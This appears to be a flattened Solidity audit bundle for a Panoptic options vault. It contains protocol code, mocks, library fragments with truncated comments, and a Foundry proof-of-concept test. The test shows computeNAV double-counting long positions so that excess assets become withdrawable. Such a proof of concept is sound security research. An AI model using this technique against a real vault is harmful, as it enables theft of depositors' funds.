        LeftRightUnsigned settledTokens,
        LeftRightUnsigned grossPremiumLast,
        LeftRightUnsigned premiumOwed,
        uint256[2] memory premiumAccumulators
    ) internal pure returns (LeftRightUnsigned) {
        unchecked {
            // long premium only accumulates as it is settled, so compute the ratio
            // of total settled tokens in a chunk to total premium owed to sellers and multiply
            // cap the ratio at 1 (it can be greater than one if some seller forfeits enough premium)
            uint256 accumulated0 = ((premiumAccumulators[0] - grossPremiumLast.rightSlot()) *
                totalLiquidity) / 2 ** 64;
            uint256 accumulated1 = ((premiumAccumulators[1] - grossPremiumLast.leftSlot()) *
                totalLiquidity) / 2 ** 64;

            return (
                LeftRightUnsigned
                    .wrap(
                        uint128(
                            Math_2.min(
                                (uint256(premiumOwed.rightSlot()) * settledTokens.rightSlot()) /
                                    (accumulated0 == 0 ? type(uint256).max : accumulated0),
                                premiumOwed.rightSlot()
                            )
                        )
                    )
                    .toLeftSlot(
                        uint128(
                            Math_2.min(
                                (uint256(premiumOwed.leftSlot()) * settledTokens.leftSlot()) /
                                    (accumulated1 == 0 ? type(uint256).max : accumulated1),
                                premiumOwed.leftSlot()
                            )
                        )
                    )
            );
        }
    }

    /// @notice Query the total amount of liquidity sold in the corresponding chunk for a position leg.
    /// @dev totalLiquidity (total sold) = removedLiquidity + netLiquidity (in AMM).
    /// @param tokenId The option position
    /// @param leg The leg of the option position to get `totalLiquidity` for
    /// @return totalLiquidity The total amount of liquidity sold in the corresponding chunk for a position leg
    /// @return netLiquidity The amount of liquidity available in the corresponding chunk for a position leg
    /// @return removedLiquidity The amount of liquidity removed through buying in the corresponding chunk for a position leg
    function _getLiquidities(
        TokenId tokenId,
        uint256 leg
    )
        internal
        view
        returns (uint256 totalLiquidity, uint128 netLiquidity, uint128 removedLiquidity)
    {
        (int24 tickLower, int24 tickUpper) = tokenId.asTicks(leg);

        LeftRightUnsigned accountLiquidities = SFPM.getAccountLiquidity(
            _V4PoolId(),
            address(this),
            tokenId.tokenType(leg),
            tickLower,
            tickUpper
        );

        netLiquidity = accountLiquidities.rightSlot();
        removedLiquidity = accountLiquidities.leftSlot();

        unchecked {
            totalLiquidity = netLiquidity + removedLiquidity;
        }
    }

    /// @notice Updates settled tokens and grossPremiumLast for a chunk after a burn and returns premium info.
    /// @param owner The owner of the option position that was burnt
    /// @param tokenId The option position that was burnt
    /// @param collectedByLeg The amount of tokens collected in the corresponding chunk for each leg of the position
    /// @param positionSize The size of the position, expressed in terms of the asset
    /// @param commitLongSettled Whether to commit the long premium that will be settled to storage
    /// @return realizedPremia The amount of premia settled by the user
    /// @return premiaByLeg The amount of premia settled by the user for each leg of the position
    function _updateSettlementPostBurn(
        address owner,
        TokenId tokenId,
        LeftRightUnsigned[4] memory collectedByLeg,
        uint128 positionSize,
        bool commitLongSettled
    ) internal returns (LeftRightSigned realizedPremia, LeftRightSigned[4] memory premiaByLeg) {
        uint256 numLegs = tokenId.countLegs();
        uint256[2][4] memory premiumAccumulatorsByLeg;

        // compute accumulated fees
        (premiaByLeg, premiumAccumulatorsByLeg) = _getPremia(
            tokenId,
            positionSize,
            owner,
            COMPUTE_PREMIA_AS_COLLATERAL,
            type(int24).max
        );

        for (uint256 leg = 0; leg < numLegs; ) {
            LeftRightSigned legPremia = premiaByLeg[leg];

            bytes32 chunkKey = keccak256(
                abi.encodePacked(tokenId.strike(leg), tokenId.width(leg), tokenId.tokenType(leg))
            );

            // collected from Uniswap
            LeftRightUnsigned settledTokens = s_settledTokens[chunkKey].add(collectedByLeg[leg]);

            // (will be) paid by long legs
            if (tokenId.isLong(leg) == 1) {
                if (commitLongSettled)
                    settledTokens = LeftRightUnsigned.wrap(
                        uint256(
                            LeftRightSigned.unwrap(
                                LeftRightSigned
                                    .wrap(int256(LeftRightUnsigned.unwrap(settledTokens)))
                                    .sub(legPremia)
                            )
                        )
                    );
                realizedPremia = realizedPremia.add(legPremia);
            } else {
                uint256 positionLiquidity;
                uint256 totalLiquidity;
                {
                    LiquidityChunk liquidityChunk = PanopticMath.getLiquidityChunk(
                        tokenId,
                        leg,
                        positionSize
                    );
                    positionLiquidity = liquidityChunk.liquidity();

                    // if position is short, ensure that removed liquidity does not deplete strike beyond MAX_SPREAD when closed
                    // new totalLiquidity (total sold) = removedLiquidity + netLiquidity (T - R)
                    totalLiquidity = _checkLiquiditySpread(tokenId, leg, MAX_SPREAD);
                }
                // T (totalLiquidity is (T - R) after burning)
                uint256 totalLiquidityBefore = totalLiquidity + positionLiquidity;

                LeftRightUnsigned grossPremiumLast = s_grossPremiumLast[chunkKey];

                LeftRightUnsigned availablePremium = _getAvailablePremium(
                    totalLiquidity + positionLiquidity,
                    settledTokens,
                    grossPremiumLast,
                    LeftRightUnsigned.wrap(uint256(LeftRightSigned.unwrap(legPremia))),
                    premiumAccumulatorsByLeg[leg]
                );

                // subtract settled tokens sent to seller
                settledTokens = settledTokens.sub(availablePremium);

                // add available premium to amount that should be settled
                realizedPremia = realizedPremia.add(
                    LeftRightSigned.wrap(int256(LeftRightUnsigned.unwrap(availablePremium)))
                );

                // update the base `premiaByLeg` value to reflect the amount of premium that will actually be settled
                premiaByLeg[leg] = LeftRightSigned.wrap(
                    int256(LeftRightUnsigned.unwrap(availablePremium))
                );

                // We need to adjust the grossPremiumLast value such that the result of
                // (grossPremium - adjustedGrossPremiumLast) * updatedTotalLiquidityPostBurn / 2**64 is equal to
                // (grossPremium - grossPremiumLast) * totalLiquidityBeforeBurn / 2**64 - premiumOwedToPosition
                // G: total gross premium (- premiumOwedToPosition)
                // T: totalLiquidityBeforeMint
                // R: positionLiquidity
                // C: current grossPremium value
                // L: current grossPremiumLast value
                // Ln: updated grossPremiumLast value
                // T * (C - L) = G
                // (T - R) * (C - Ln) = G - P
                //
                // T * (C - L) = (T - R) * (C - Ln) + P
                // (TC - TL - P) / (T - R) = C - Ln
                // Ln = C - (TC - TL - P) / (T - R)
                // Ln = (TC - CR - TC + LT + P) / (T-R)
                // Ln = (LT - CR + P) / (T-R)

                unchecked {
                    uint256[2][4] memory _premiumAccumulatorsByLeg = premiumAccumulatorsByLeg;
                    uint256 _leg = leg;

                    // if there's still liquidity, compute the new grossPremiumLast
                    // otherwise, we just reset grossPremiumLast to the current grossPremium
                    s_grossPremiumLast[chunkKey] = totalLiquidity != 0
                        ? LeftRightUnsigned
                            .wrap(
                                uint128(
                                    uint256(
                                        Math_2.max(
                                            (int256(
                                                grossPremiumLast.rightSlot() * totalLiquidityBefore
                                            ) -
                                                int256(
                                                    _premiumAccumulatorsByLeg[_leg][0] *
                                                        positionLiquidity
                                                )) + int256(legPremia.rightSlot() * 2 ** 64),
                                            0
                                        )
                                    ) / totalLiquidity
                                )
                            )
                            .toLeftSlot(
                                uint128(
                                    uint256(
                                        Math_2.max(
                                            (int256(
                                                grossPremiumLast.leftSlot() * totalLiquidityBefore
                                            ) -
                                                int256(
                                                    _premiumAccumulatorsByLeg[_leg][1] *
                                                        positionLiquidity
                                                )) + int256(legPremia.leftSlot()) * 2 ** 64,
                                            0
                                        )
                                    ) / totalLiquidity
                                )
                            )
                        : LeftRightUnsigned
                            .wrap(uint128(premiumAccumulatorsByLeg[_leg][0]))
                            .toLeftSlot(uint128(premiumAccumulatorsByLeg[_leg][1]));
                }
            }
            // update settled tokens in storage with all local deltas
            s_settledTokens[chunkKey] = settledTokens;

            // erase the s_options entry for that leg
            s_options[owner][tokenId][leg] = LeftRightUnsigned.wrap(0);

            unchecked {
                ++leg;
            }
        }

        // reset balances and delete stored option data
        s_positionBalance[owner][tokenId] = PositionBalance.wrap(0);

        // REMOVE the current tokenId from the position list hash (hash = XOR of all keccak256(tokenId), remove by XOR'ing again)
        // and decrease the number of positions counter by 1.
        _updatePositionsHash(owner, tokenId, !ADD);
    }
}

contract VaultAccountantMock {
    uint256 public nav;
    address public expectedVault;
    bytes public expectedManagerInput;

    function setNav(uint256 _nav) external {
        nav = _nav;
    }

    function setExpectedVault(address _expectedVault) external {
        expectedVault = _expectedVault;
    }

    function setExpectedManagerInput(bytes memory _expectedManagerInput) external {
        expectedManagerInput = _expectedManagerInput;
    }

    function computeNAV(
        address vault,
        address,
        bytes memory managerInput
    ) external view returns (uint256) {
        require(vault == expectedVault, "Invalid vault");
        if (managerInput.length > 0) {
            require(
                keccak256(managerInput) == keccak256(expectedManagerInput),
                "Invalid manager input"
            );
        }
        return nav;
    }
}



type BeforeSwapDelta is int256;
function toBeforeSwapDelta(int128 deltaSpecified, int128 deltaUnspecified)
    pure
    returns (BeforeSwapDelta beforeSwapDelta)
{
    assembly ("memory-safe") {
        beforeSwapDelta := or(shl(128, deltaSpecified), and(sub(shl(128, 1), 1), deltaUnspecified))
    }
}
type LiquidityChunk is uint256;
using LiquidityChunkLibrary for LiquidityChunk global;
 * @dev Standard math utilities missing in the Solidity language.
 */
 * @dev Standard math utilities missing in the Solidity language.
 */
type PositionBalance is uint256;
using PositionBalanceLibrary for PositionBalance global;
 * @dev Standard signed math utilities missing in the Solidity language.
 */
 * @dev Implementation of the {IERC165} interface.
struct FindData {
    uint256 slot;
    uint256 offsetLeft;
    uint256 offsetRight;
    bool found;
}
type BalanceDelta is int256;
using {add as +, sub as -, eq as ==, neq as !=} for BalanceDelta global;
type Currency is address;
using {greaterThan as >, lessThan as <, greaterThanOrEqualTo as >=, equals as ==} for Currency global;
type LeftRightUnsigned is uint256;
using LeftRightLibrary for LeftRightUnsigned global;
type LeftRightSigned is int256;
using LeftRightLibrary for LeftRightSigned global;
type PoolId is bytes32;
using PoolIdLibrary for PoolKey global;
struct PoolKey {
    Currency currency0;
    Currency currency1;
    uint24 fee;
    int24 tickSpacing;
    IHooks hooks;
}
type TokenId is uint256;
using TokenIdLibrary for TokenId global;
                            MOCKS
                            TESTS
library Address {
     * @dev Returns true if `account` is a contract.
     *
     * [IMPORTANT]
     * ====
     * It is unsafe to assume that an address for which this function returns
     * false is an externally-owned account (EOA) and not a contract.
     *
     * Among others, `isContract` will return false for the following
     * types of addresses:
     *
     *  - an externally-owned account
     *  - a contract in construction
     *  - an address where a contract will be created
     *  - an address where a contract lived, but was destroyed
     * ====
     *
     * [IMPORTANT]
     * ====
     * You shouldn't rely on `isContract` to protect against flash loan attacks!
     *
     * Preventing calls from contracts is highly discouraged. It breaks composability, breaks support for smart wallets
     * like Gnosis Safe, and does not provide security since it can be circumvented by calling from a contract
     * constructor.
     * ====
     */
    function isContract(address account) internal view returns (bool) {
        return account.code.length > 0;
    }
     * @dev Replacement for Solidity's `transfer`: sends `amount` wei to
     * `recipient`, forwarding all available gas and reverting on errors.
     *
     * https:
     * of certain opcodes, possibly making contracts go over the 2300 gas limit
     * imposed by `transfer`, making them unable to receive funds via
     * `transfer`. {sendValue} removes this limitation.
     *
     * https:
     *
     * IMPORTANT: because control is transferred to `recipient`, care must be
     * taken to not create reentrancy vulnerabilities. Consider using
     * {ReentrancyGuard} or the
     * https:
     */
    function sendValue(address payable recipient, uint256 amount) internal {
        require(address(this).balance >= amount, "Address: insufficient balance");
        (bool success, ) = recipient.call{value: amount}("");
        require(success, "Address: unable to send value, recipient may have reverted");
    }
     * @dev Performs a Solidity function call using a low level `call`. A
     * plain `call` is an unsafe replacement for a function call: use this
     * function instead.
     *
     * If `target` reverts with a revert reason, it is bubbled up by this
     * function (like regular Solidity function calls).
     *
     * Returns the raw returned data. To convert to the expected return value,
     * use https:
     *
     * Requirements:
     *
     * - `target` must be a contract.
     * - calling `target` with `data` must not revert.
     *
     * _Available since v3.1._
     */
    function functionCall(address target, bytes memory data) internal returns (bytes memory) {
        return functionCallWithValue(target, data, 0, "Address: low-level call failed");
    }
     * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`], but with
     * `errorMessage` as a fallback revert reason when `target` reverts.
     *
     * _Available since v3.1._
     */
    function functionCall(
        address target,
        bytes memory data,
        string memory errorMessage
    ) internal returns (bytes memory) {
        return functionCallWithValue(target, data, 0, errorMessage);
    }
     * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],
     * but also transferring `value` wei to `target`.
     *
     * Requirements:
     *
     * - the calling contract must have an ETH balance of at least `value`.
     * - the called Solidity function must be `payable`.
     *
     * _Available since v3.1._
     */
    function functionCallWithValue(
        address target,
        bytes memory data,
        uint256 value
    ) internal returns (bytes memory) {
        return functionCallWithValue(target, data, value, "Address: low-level call with value failed");
    }
     * @dev Same as {xref-Address-functionCallWithValue-address-bytes-uint256-}[`functionCallWithValue`], but
     * with `errorMessage` as a fallback revert reason when `target` reverts.
     *
     * _Available since v3.1._
     */
    function functionCallWithValue(
        address target,
        bytes memory data,
        uint256 value,
        string memory errorMessage
    ) internal returns (bytes memory) {
        require(address(this).balance >= value, "Address: insufficient balance for call");
        (bool success, bytes memory returndata) = target.call{value: value}(data);
        return verifyCallResultFromTarget(target, success, returndata, errorMessage);
    }
     * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],
     * but performing a static call.
     *
     * _Available since v3.3._
     */
    function functionStaticCall(address target, bytes memory data) internal view returns (bytes memory) {
        return functionStaticCall(target, data, "Address: low-level static call failed");
    }
     * @dev Same as {xref-Address-functionCall-address-bytes-string-}[`functionCall`],
     * but performing a static call.
     *
     * _Available since v3.3._
     */
    function functionStaticCall(
        address target,
        bytes memory data,
        string memory errorMessage
    ) internal view returns (bytes memory) {
        (bool success, bytes memory returndata) = target.staticcall(data);
        return verifyCallResultFromTarget(target, success, returndata, errorMessage);
    }
     * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],
     * but performing a delegate call.
     *
     * _Available since v3.4._
     */
    function functionDelegateCall(address target, bytes memory data) internal returns (bytes memory) {
        return functionDelegateCall(target, data, "Address: low-level delegate call failed");
    }
     * @dev Same as {xref-Address-functionCall-address-bytes-string-}[`functionCall`],
     * but performing a delegate call.
     *
     * _Available since v3.4._
     */
    function functionDelegateCall(
        address target,
        bytes memory data,
        string memory errorMessage
    ) internal returns (bytes memory) {
        (bool success, bytes memory returndata) = target.delegatecall(data);
        return verifyCallResultFromTarget(target, success, returndata, errorMessage);
    }
     * @dev Tool to verify that a low level call to smart-contract was successful, and revert (either by bubbling
     * the revert reason or using the provided one) in case of unsuccessful call or if target was not a contract.
     *
     * _Available since v4.8._
     */
    function verifyCallResultFromTarget(
        address target,
        bool success,
        bytes memory returndata,
        string memory errorMessage
    ) internal view returns (bytes memory) {
        if (success) {
            if (returndata.length == 0) {
                require(isContract(target), "Address: call to non-contract");
            }
            return returndata;
        } else {
            _revert(returndata, errorMessage);
        }
    }
     * @dev Tool to verify that a low level call was successful, and revert if it wasn't, either by bubbling the
     * revert reason or using the provided one.
     *
     * _Available since v4.3._
     */
    function verifyCallResult(
        bool success,
        bytes memory returndata,
        string memory errorMessage
    ) internal pure returns (bytes memory) {
        if (success) {
            return returndata;
        } else {
            _revert(returndata, errorMessage);
        }
    }
    function _revert(bytes memory returndata, string memory errorMessage) private pure {
        if (returndata.length > 0) {
            assembly {
                let returndata_size := mload(returndata)
                revert(add(32, returndata), returndata_size)
            }
        } else {
            revert(errorMessage);
        }
    }
}
contract Clone {}
library FixedPointMathLib { /* stdlib: collapsed */ }
    struct State {
        uint128 liquidity;
        uint256 feeGrowthInside0LastX128;
        uint256 feeGrowthInside1LastX128;
    }
library SafeTransferLib { /* stdlib: collapsed */ }
library SignedMath { /* stdlib: collapsed */ }
    struct ChainData {
        string name;
        uint256 chainId;
        string rpcUrl;
    }
    struct RawTx1559Detail {
        AccessList[] accessList;
        bytes data;
        address from;
        bytes gas;
        bytes nonce;
        address to;
        bytes txType;
        bytes value;
    }
    struct Tx1559 {
        string[] arguments;
        address contractAddress;
        string contractName;
        string functionSig;
        bytes32 hash;
        Tx1559Detail txDetail;
        string opcode;
    }
    struct Tx1559Detail {
        AccessList[] accessList;
        bytes data;
        address from;
        uint256 gas;
        uint256 nonce;
        address to;
        uint256 txType;
        uint256 value;
    }
    struct TxDetailLegacy {
        AccessList[] accessList;
        uint256 chainId;
        bytes data;
        address from;
        uint256 gas;
        uint256 gasPrice;
        bytes32 hash;
        uint256 nonce;
        bytes1 opcode;
        bytes32 r;
        bytes32 s;
        uint256 txType;
        address to;
        uint8 v;
        uint256 value;
    }
    struct AccessList {
        address accessAddress;
        bytes32[] storageKeys;
    }
    struct RawReceipt {
        bytes32 blockHash;
        bytes blockNumber;
        address contractAddress;
        bytes cumulativeGasUsed;
        bytes effectiveGasPrice;
        address from;
        bytes gasUsed;
        RawReceiptLog[] logs;
        bytes logsBloom;
        bytes status;
        address to;
        bytes32 transactionHash;
        bytes transactionIndex;
    }
    struct EIP1559ScriptArtifact {
        string[] libraries;
        string path;
        string[] pending;
        Receipt[] receipts;
        uint256 timestamp;
        Tx1559[] transactions;
        TxReturn[] txReturns;
    }
    struct RawEIP1559ScriptArtifact {
        string[] libraries;
        string path;
        string[] pending;
        RawReceipt[] receipts;
        TxReturn[] txReturns;
        uint256 timestamp;
        RawTx1559[] transactions;
    }
    struct RawReceiptLog {
        address logAddress;
        bytes32 blockHash;
        bytes blockNumber;
        bytes data;
        bytes logIndex;
        bool removed;
        bytes32[] topics;
        bytes32 transactionHash;
        bytes transactionIndex;
        bytes transactionLogIndex;
    }
    struct ReceiptLog {
        address logAddress;
        bytes32 blockHash;
        uint256 blockNumber;
        bytes data;
        uint256 logIndex;
        bytes32[] topics;
        uint256 transactionIndex;
        uint256 transactionLogIndex;
        bool removed;
    }
    struct TxReturn {
        string internalType;
        string value;
    }
    struct Account {
        address addr;
        uint256 key;
    }
    enum AddressType {
        Payable,
        NonPayable,
        ZeroAddress,
        Precompile,
        ForgeAddress
    }
    struct FuzzArtifactSelector {
        string artifact;
        bytes4[] selectors;
    }
library StdStyle {}
library console { /* stdlib: collapsed */ }
library safeconsole {}
    struct PoolIdData {
        uint128 maxLiquidityPerTick;
        uint64 poolId;
        int24 minEnforcedTick;
        int24 maxEnforcedTick;
        bool initialized;
    }
    struct PendingWithdrawal {
        uint128 amount;
        uint128 basis;
    }
    struct DepositEpochState {
        uint128 assetsDeposited;
        uint128 sharesReceived;
        uint128 assetsFulfilled;
    }
    struct WithdrawalEpochState {
        uint128 sharesWithdrawn;
        uint128 assetsReceived;
        uint128 sharesFulfilled;
    }
    struct PoolInfo {
        PanopticPool pool;
        IERC20Partial token0;
        IERC20Partial token1;
        IV3CompatibleOracle poolOracle;
        IV3CompatibleOracle oracle0;
        bool isUnderlyingToken0InOracle0;
        IV3CompatibleOracle oracle1;
        bool isUnderlyingToken0InOracle1;
        int24 maxPriceDeviation;
        uint32 twapWindow;
    }
    struct ManagerPrices {
        int24 poolPrice;
        int24 token0Price;
        int24 token1Price;
    }
contract PoC is Test {
    address Manager = address(0x1234);
    address FeeWallet = address(0x5678);
    address Alice = address(0x123456);
    address Bob = address(0x12345678);
    address Charlie = address(0x1234567891);
    address Dave = address(0x12345678912);
    address Eve = address(0x123456789123);
    uint256 constant INITIAL_BALANCE = 1000000 ether;
    uint256 constant BOOTSTRAP_SHARES = 1_000_000;
    int24 constant TWAP_TICK = 100;
    int24 constant MAX_PRICE_DEVIATION = 50;
    uint32 constant TWAP_WINDOW = 600; 
    function setUp() public {
        mockAccountant = new VaultAccountantMock();
        token = new ERC20S("Test Token", "TEST", 18);
        vault = new HypoVault(address(token), Manager, IVaultAccountant(address(mockAccountant)), 100); // 1% performance fee
        vault.setFeeWallet(FeeWallet);
        address[6] memory users = [Alice, Bob, Charlie, Dave, Eve, Manager];
        for (uint i = 0; i < users.length; i++) {
            token.mint(users[i], INITIAL_BALANCE);
            vm.prank(users[i]);
            token.approve(address(vault), type(uint256).max);
        }
        accountant = new PanopticVaultAccountant();
        token0 = new MockERC20Partial("Token0", "T0");
        token1 = new MockERC20Partial("Token1", "T1");
        underlyingToken = new MockERC20Partial("Underlying", "UND");
        poolOracle = new MockV3CompatibleOracle();
        oracle0 = new MockV3CompatibleOracle();
        oracle1 = new MockV3CompatibleOracle();
        mockPool = new MockPanopticPool();
        _setupDefaultOracles();
    }
    function _setupDefaultOracles() internal {
        int56[] memory defaultTicks = new int56[](20);
        uint32 intervalDuration = TWAP_WINDOW / 20; // 30 seconds
        for (uint i = 0; i < 20; i++) {
            defaultTicks[i] = int56(
                int256(TWAP_TICK) * int256(uint256(intervalDuration)) * int256(20 - i)
            );
        }
        poolOracle.setTickCumulatives(defaultTicks);
        oracle0.setTickCumulatives(defaultTicks);
        oracle1.setTickCumulatives(defaultTicks);
    }
    function test_submissionValidity() external {
        PanopticPool mockPoolInterface = PanopticPool(address(mockPool));
        PanopticVaultAccountant.PoolInfo[] memory pools = new PanopticVaultAccountant.PoolInfo[](1);
        pools[0] = PanopticVaultAccountant.PoolInfo({
            pool: mockPoolInterface,
            token0: token0,
            token1: token1,
            poolOracle: poolOracle,
            oracle0: oracle0,
            isUnderlyingToken0InOracle0: true,
            oracle1: oracle1,
            isUnderlyingToken0InOracle1: false,
            maxPriceDeviation: MAX_PRICE_DEVIATION,
            twapWindow: TWAP_WINDOW
        });
        accountant.updatePoolsHash(address(vault), keccak256(abi.encode(pools)));
        uint256 initialAmount = 1000 ether;
        token0.mint(address(vault), initialAmount);
        PanopticVaultAccountant.ManagerPrices[]
            memory baseManagerPrices = new PanopticVaultAccountant.ManagerPrices[](1);
        baseManagerPrices[0] = PanopticVaultAccountant.ManagerPrices({
            poolPrice: TWAP_TICK,
            token0Price: TWAP_TICK,
            token1Price: TWAP_TICK
        });
        TokenId[][] memory emptyTokenIds = new TokenId[][](1);
        emptyTokenIds[0] = new TokenId[](0);
        bytes memory baseManagerInput = abi.encode(baseManagerPrices, pools, emptyTokenIds);
        uint256 baselineNAV = accountant.computeNAV(
            address(vault),
            address(token0),
            baseManagerInput
        );
        console.log("Baseline NAV (no positions): ", baselineNAV);
        uint256 shortPositionAmount = 500 ether;
        token0.mint(address(mockPool), shortPositionAmount); // Tokens moved to AMM pool for short position
        uint256[2][] memory shortPositions = new uint256[2][](1);
        shortPositions[0] = [uint256(1), uint256(shortPositionAmount)]; // Position ID and amount
        mockPool.setMockPositionBalanceArray(shortPositions);
        mockPool.setNumberOfLegs(address(vault), 0);
        mockPool.setMockPremiums(
            LeftRightUnsigned.wrap(0),
            LeftRightUnsigned.wrap(uint256(shortPositionAmount))
        );
        PanopticVaultAccountant.ManagerPrices[]
            memory managerPrices = new PanopticVaultAccountant.ManagerPrices[](1);
        managerPrices[0] = PanopticVaultAccountant.ManagerPrices({
            poolPrice: TWAP_TICK,
            token0Price: TWAP_TICK,
            token1Price: TWAP_TICK
        });
        bytes memory managerInput = abi.encode(managerPrices, pools, emptyTokenIds);
        uint256 navWithShort = accountant.computeNAV(address(vault), address(token0), managerInput);
        console.log("NAV with short position (expected reduced): ", navWithShort);
        console.log("Reduction due to short position: ", baselineNAV - navWithShort);
        assertLt(navWithShort, baselineNAV, "Short position should reduce NAV");
        assertEq(
            baselineNAV - navWithShort,
            shortPositionAmount,
            "NAV should be reduced by short position amount"
        );
        uint256 longPositionAmount = 400 ether;
        token0.mint(address(vault), longPositionAmount); // Tokens moved back to Panoptic Pool
        uint256[2][] memory bothPositions = new uint256[2][](2);
        bothPositions[0] = [uint256(1), uint256(shortPositionAmount)]; // Short position
        bothPositions[1] = [uint256(2), uint256(longPositionAmount)]; // Long position
        mockPool.setMockPositionBalanceArray(bothPositions);
        mockPool.setMockPremiums(
            LeftRightUnsigned.wrap(uint256(longPositionAmount)),
            LeftRightUnsigned.wrap(uint256(shortPositionAmount))
        );
        uint256 navWithBoth = accountant.computeNAV(address(vault), address(token0), managerInput);
        console.log("NAV with both positions: ", navWithBoth);
        console.log("Increase from short-only to both positions: ", navWithBoth - navWithShort);
        assertGt(navWithBoth, navWithShort, "NAV improperly increases with long position");
        uint256 availableForWithdrawal = navWithBoth - (baselineNAV - navWithShort);
        console.log("Vulnerable assets available for withdrawal: ", availableForWithdrawal);
        assertGt(
            availableForWithdrawal,
            0,
            "Vulnerability exists: assets needed for long positions can be withdrawn"
        );
        console.log(
            "Vulnerability ratio: available withdrawal / long position = ",
            (availableForWithdrawal * 100) / longPositionAmount,
            "%"
        );
        assertEq(
            availableForWithdrawal,
            2 * longPositionAmount,
            "CRITICAL VULNERABILITY: Available withdrawal is exactly 2x the long position amount"
        );
        console.log("EXPLANATION OF DOUBLE-COUNTING:");
        console.log("1. Actual tokens returned to vault: ", longPositionAmount);
        console.log("2. Long position incorrectly counted as positive value: ", longPositionAmount);
        console.log("3. Total double-counted assets: ", 2 * longPositionAmount);
    }

function updatePoolsHash(address vault, bytes32 poolsHash) external onlyOwner {
        if (vaultLocked[vault]) revert VaultLocked();
        vaultPools[vault] = poolsHash;
    }

function computeNAV(
        address vault,
        address underlyingToken,
        bytes calldata managerInput
    ) external view returns (uint256 nav) {
        (
            ManagerPrices[] memory managerPrices,
            PoolInfo[] memory pools,
            TokenId[][] memory tokenIds
        ) = abi.decode(managerInput, (ManagerPrices[], PoolInfo[], TokenId[][]));

        if (keccak256(abi.encode(pools)) != vaultPools[vault]) revert InvalidPools();

        address[] memory underlyingTokens = new address[](pools.length * 2);

        // resolves stack too deep error
        address _vault = vault;

        for (uint256 i = 0; i < pools.length; i++) {
            if (
                Math_2.abs(
                    managerPrices[i].poolPrice -
                        PanopticMath.twapFilter(pools[i].poolOracle, pools[i].twapWindow)
                ) > pools[i].maxPriceDeviation
            ) revert StaleOraclePrice();

            uint256[2][] memory positionBalanceArray;
            int256 poolExposure0;
            int256 poolExposure1;
            {
                LeftRightUnsigned shortPremium;
                LeftRightUnsigned longPremium;

                (shortPremium, longPremium, positionBalanceArray) = pools[i]
                    .pool
                    .getAccumulatedFeesAndPositionsData(_vault, true, tokenIds[i]);

                poolExposure0 =
                    int256(uint256(shortPremium.rightSlot())) -
                    int256(uint256(longPremium.rightSlot()));
                poolExposure1 =
                    int256(uint256(longPremium.leftSlot())) -
                    int256(uint256(shortPremium.leftSlot()));
            }

            uint256 numLegs;
            for (uint256 j = 0; j < tokenIds[i].length; j++) {
                if (positionBalanceArray[j][1] == 0) revert IncorrectPositionList();
                uint256 positionLegs = tokenIds[i][j].countLegs();
                for (uint256 k = 0; k < positionLegs; k++) {
                    (uint256 amount0, uint256 amount1) = Math_2.getAmountsForLiquidity(
                        managerPrices[i].poolPrice,
                        PanopticMath.getLiquidityChunk(
                            tokenIds[i][j],
                            k,
                            uint128(positionBalanceArray[j][1])
                        )
                    );

                    if (tokenIds[i][j].isLong(k) == 0) {
                        unchecked {
                            poolExposure0 += int256(amount0);
                            poolExposure1 += int256(amount1);
                        }
                    } else {
                        unchecked {
                            poolExposure0 -= int256(amount0);
                            poolExposure1 -= int256(amount1);
                        }
                    }
                }

                (LeftRightSigned longAmounts, LeftRightSigned shortAmounts) = PanopticMath
                    .computeExercisedAmounts(tokenIds[i][j], uint128(positionBalanceArray[j][1]));

                poolExposure0 += int256(longAmounts.rightSlot()) - int256(shortAmounts.rightSlot());
                poolExposure1 += int256(longAmounts.leftSlot()) - int256(shortAmounts.leftSlot());

                numLegs += positionLegs;
            }

            if (numLegs != pools[i].pool.numberOfLegs(_vault)) revert IncorrectPositionList();

            if (address(pools[i].token0) == address(0))
                pools[i].token0 = IERC20Partial(0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE);

            bool skipToken0 = false;
            bool skipToken1 = false;

            // optimized for small number of pools
            for (uint256 j = 0; j < underlyingTokens.length; j++) {
                if (underlyingTokens[j] == address(pools[i].token0)) skipToken0 = true;
                if (underlyingTokens[j] == address(pools[i].token1)) skipToken1 = true;

                if (underlyingTokens[j] == address(0)) {
                    if (!skipToken0) underlyingTokens[j] = address(pools[i].token0);
                    // ensure a gap is not created in the underlyingTokens array
                    if (!skipToken1)
                        underlyingTokens[j + (skipToken0 ? 0 : 1)] = address(pools[i].token1);
                    break;
                }
            }

            if (!skipToken0)
                poolExposure0 += address(pools[i].token0) ==
                    address(0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE)
                    ? int256(address(_vault).balance)
                    : int256(pools[i].token0.balanceOf(_vault));
            if (!skipToken1) poolExposure1 += int256(pools[i].token1.balanceOf(_vault));

            uint256 collateralBalance = pools[i].pool.collateralToken0().balanceOf(_vault);
            poolExposure0 += int256(
                pools[i].pool.collateralToken0().previewRedeem(collateralBalance)
            );

            collateralBalance = pools[i].pool.collateralToken1().balanceOf(_vault);
            poolExposure1 += int256(
                pools[i].pool.collateralToken1().previewRedeem(collateralBalance)
            );

            // convert position values to underlying
            if (address(pools[i].token0) != underlyingToken) {
                int24 conversionTick = PanopticMath.twapFilter(
                    pools[i].oracle0,
                    pools[i].twapWindow
                );
                if (
                    Math_2.abs(conversionTick - managerPrices[i].token0Price) >
                    pools[i].maxPriceDeviation
                ) revert StaleOraclePrice();

                uint160 conversionPrice = Math_2.getSqrtRatioAtTick(
                    pools[i].isUnderlyingToken0InOracle0 ? -conversionTick : conversionTick
                );

                poolExposure0 = PanopticMath.convert0to1(poolExposure0, conversionPrice);
            }

            if (address(pools[i].token1) != underlyingToken) {
                int24 conversionTick = PanopticMath.twapFilter(
                    pools[i].oracle1,
                    pools[i].twapWindow
                );
                if (
                    Math_2.abs(conversionTick - managerPrices[i].token1Price) >
                    pools[i].maxPriceDeviation
                ) revert StaleOraclePrice();

                uint160 conversionPrice = Math_2.getSqrtRatioAtTick(
                    pools[i].isUnderlyingToken0InOracle1 ? conversionTick : -conversionTick
                );

                poolExposure1 = PanopticMath.convert1to0(poolExposure1, conversionPrice);
            }

            // debt in pools with negative exposure does not need to be paid back
            nav += uint256(Math_2.max(poolExposure0 + poolExposure1, 0));
        }

        // underlying cannot be native (0x000/0xeee)
        bool skipUnderlying = false;
